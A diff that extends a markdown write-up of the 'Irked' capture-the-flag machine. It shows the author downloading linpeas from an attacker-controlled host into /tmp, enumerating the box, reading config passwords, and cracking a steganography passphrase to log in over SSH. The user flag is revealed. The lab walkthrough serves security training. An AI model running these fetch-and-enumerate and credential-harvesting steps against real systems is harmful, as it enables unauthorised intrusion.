@@ -240,11 +240,289 @@ Super elite steg backup pw
 UPupDOWNdownLRlrBAbaSSss
 ```
 
-`steg` not `ssh` password.. 
+`steg` not `ssh` password..
 
+time for linpeas
+
+```
+wget http://10.10.14.9:8000/linpeas.sh -O /tmp/linpeas.sh
+which wget
+/usr/bin/wget
+wget http://10.10.14.9:8000
+wget http://10.10.14.9:8000 2>&1
+--2022-07-24 10:04:36--  http://10.10.14.9:8000/
+Connecting to 10.10.14.9:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 559 [text/html]
+Saving to: ‘index.html’
+
+     0K                                                       100%  126M=0s
+
+2022-07-24 10:04:36 (126 MB/s) - ‘index.html’ saved [559/559]
+
+wget http://10.10.14.9:8000/linpeas.sh -O /tmp/linpeas.sh 2>&1
+--2022-07-24 10:04:55--  http://10.10.14.9:8000/linpeas.sh
+Connecting to 10.10.14.9:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 776967 (759K) [text/x-sh]
+Saving to: ‘/tmp/linpeas.sh’
+
+     0K .......... .......... .......... .......... ..........  6%  410K 2s
+    50K .......... .......... .......... .......... .......... 13%  836K 1s
+   100K .......... .......... .......... .......... .......... 19% 5.95M 1s
+   150K .......... .......... .......... .......... .......... 26% 1.15M 1s
+   200K .......... .......... .......... .......... .......... 32% 3.63M 1s
+   250K .......... .......... .......... .......... .......... 39%  369K 1s
+   300K .......... .......... .......... .......... .......... 46% 1.47M 0s
+   350K .......... .......... .......... .......... .......... 52% 3.02M 0s
+   400K .......... .......... .......... .......... .......... 59% 9.70M 0s
+   450K .......... .......... .......... .......... .......... 65% 1.61M 0s
+   500K .......... .......... .......... .......... .......... 72%  528K 0s
+   550K .......... .......... .......... .......... .......... 79% 18.0M 0s
+   600K .......... .......... .......... .......... .......... 85% 2.40M 0s
+   650K .......... .......... .......... .......... .......... 92% 2.64M 0s
+   700K .......... .......... .......... .......... .......... 98% 13.9M 0s
+   750K ........                                              100% 73.7M=0.6s
+
+2022-07-24 10:04:56 (1.22 MB/s) - ‘/tmp/linpeas.sh’ saved [776967/776967]
+```
+
+another issue in a busted shell where same command fails unless we redirect STDOUT and STDERR
+
+```
+
+                                        ╔═════════════════════╗
+════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════
+                                        ╚═════════════════════╝
+╔══════════╣ Hostname, hosts and DNS
+irked
+127.0.0.1       localhost
+127.0.1.1       irked.irked.htb irked
+
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+search mi.army.mil
+nameserver 10.10.10.2
+irked.htb
+
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:65534           0.0.0.0:*               LISTEN      677/ircd
+tcp        0      0 0.0.0.0:8067            0.0.0.0:*               LISTEN      677/ircd
+tcp        0      0 0.0.0.0:34435           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      677/ircd
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+tcp6       0      0 ::1:631                 :::*                    LISTEN      -
+tcp6       0      0 ::1:25                  :::*                    LISTEN      -
+tcp6       0      0 :::60129                :::*                    LISTEN      -
+tcp6       0      0 :::111                  :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+
+...
+
+╔══════════╣ Users with console
+djmardov:x:1000:1000:djmardov,,,:/home/djmardov:/bin/bash
+ircd:x:1001:1001::/home/ircd:/bin/sh
+root:x:0:0:root:/root:/bin/bash
+speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+```
+
+```
+ping -c 5 10.10.10.2
+PING 10.10.10.2 (10.10.10.2) 56(84) bytes of data.
+64 bytes from 10.10.10.2: icmp_seq=1 ttl=64 time=0.144 ms
+64 bytes from 10.10.10.2: icmp_seq=2 ttl=64 time=0.358 ms
+64 bytes from 10.10.10.2: icmp_seq=3 ttl=64 time=0.283 ms
+64 bytes from 10.10.10.2: icmp_seq=4 ttl=64 time=0.228 ms
+64 bytes from 10.10.10.2: icmp_seq=5 ttl=64 time=0.164 ms
+
+--- 10.10.10.2 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 3997ms
+rtt min/avg/max/mdev = 0.144/0.235/0.358/0.079 ms
+```
+
+hrmm..
+
+looking at `/home/ircd/Unreal3.2/` contents, starting with `unrealircd.conf`:
+
+```
+...
+
+admin {
+        "Bob Smith";
+        "bob";
+        "widely@used.name";
+};
+...
+
+/* Passworded allow line */
+allow {
+        ip             *@255.255.255.255;
+        hostname       *@*.passworded.ugly.people;
+        class           clients;
+        password "f00Ness";
+        maxperip 1;
+};
+
+...
+oper bobsmith {
+        class           clients;
+        from {
+                userhost bob@smithco.com;
+        };
+        password "f00";
+        flags
+        {
+                netadmin;
+                can_zline;
+                can_gzline;
+                can_gkline;
+                global;
+        };
+};
+
+...
+link            hub.mynet.com
+{
+        username        *;
+        hostname        1.2.3.4;
+        bind-ip         *;
+        port            7029;
+        hub             *;
+        password-connect "LiNk";
+        password-receive "LiNk";
+        class           servers;
+                options {
+                        /* Note: You should not use autoconnect when linking services */
+                        autoconnect;
+//                      ssl;
+//                      zip;
+                };
+...
+
+ * drpass {
+ *  restart             "(password for restarting)";
+ *  die                 "(password for die)";
+ * };
+ */
+drpass {
+        restart "I-love-to-restart";
+        die "die-you-stupid";
+};
+
+...
+
+vhost {
+        vhost           i.hate.microsefrs.com;
+        from {
+                userhost       *@*.image.dk;
+        };
+        login           stskeeps;
+        password        moocowsrulemyworld;
+};
+
+...
+set {
+        kline-address "djmardov@irked.htb";
+        modes-on-connect "+ixw";
+        modes-on-oper    "+xwgs";
+        oper-auto-join "#opers";
+        options {
+                hide-ulines;
+                /* You can enable ident checking here if you want */
+                /* identd-check; */
+                show-connect-info;
+        };
+```
+
+```
+ls -laR /home/ircd/Unreal3.2/keys
+/home/ircd/Unreal3.2/keys:
+total 16
+drwx------  3 ircd ircd 4096 Apr 13  2009 .
+drwx------ 13 ircd ircd 4096 Jul 24 10:04 ..
+drwx------  2 ircd ircd 4096 Apr 13  2009 CVS
+-rw-------  1 ircd ircd    2 Apr 24  2004 .KEYS
+
+/home/ircd/Unreal3.2/keys/CVS:
+total 24
+drwx------ 2 ircd ircd 4096 Apr 13  2009 .
+drwx------ 3 ircd ircd 4096 Apr 13  2009 ..
+-rw------- 1 ircd ircd   51 Apr 13  2009 Entries
+-rw------- 1 ircd ircd   12 Apr 13  2009 Repository
+-rw------- 1 ircd ircd   43 Apr 13  2009 Root
+-rw------- 1 ircd ircd    8 Apr 13  2009 Tag
+cat /home/ircd/Unreal3.2/keys/CVS/Root
+:pserver:anonymous@cvs.unrealircd.com:/cvs
+```
+
+tried the few passwords we see as SSH for djmardov - no success.
+
+still looking for a backup of some sort
+
+... or is that actually the stego password for [irked.jpg](irked.jpg)?
+
+```
+$ stegseek --crack irked.jpg wl.txt
+StegSeek version 0.5
+Progress: 0.00% (0 bytes)
+
+[i] --> Found passphrase: "UPupDOWNdownLRlrBAbaSSss"
+[i] Original filename: "pass.txt"
+[i] Extracting to "irked.jpg.out"
+$ cat irked.jpg.out
+Kab6h+m+bbp2J:HG
+$ ssh -l djmardov irked.htb
+Warning: Permanently added 'irked.htb,10.10.10.117' (ECDSA) to the list of known hosts.
+djmardov@irked.htb's password:
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
+djmardov@irked:~$
+djmardov@irked:~$ cat Documents/user.txt
+4a66a78b12dc0e661a59d3f5c0267a8e
+```
+
+awww yeah.
+
+### djmardov
+
+```
+djmardov@irked:~$ sudo -l
+-bash: sudo: command not found
+djmardov@irked:~$ crontab -l
+no crontab for djmardov
+```
+
+linpeas from this side.. thinking cups
+
+```
+djmardov@irked:~$ apt-cache policy cups
+cups:
+  Installed: 1.7.5-11+deb8u2
+  Candidate: 1.7.5-11+deb8u2
+  Version table:
+ *** 1.7.5-11+deb8u2 0
+        500 http://ftp.us.debian.org/debian/ jessie/main i386 Packages
+        100 /var/lib/dpkg/status
+     1.7.5-11+deb8u1 0
+        500 http://security.debian.org/ jessie/updates/main i386 Packages
+
+```
 
 ## flag
 ```
-user:
+user:4a66a78b12dc0e661a59d3f5c0267a8e
 root:
 ```
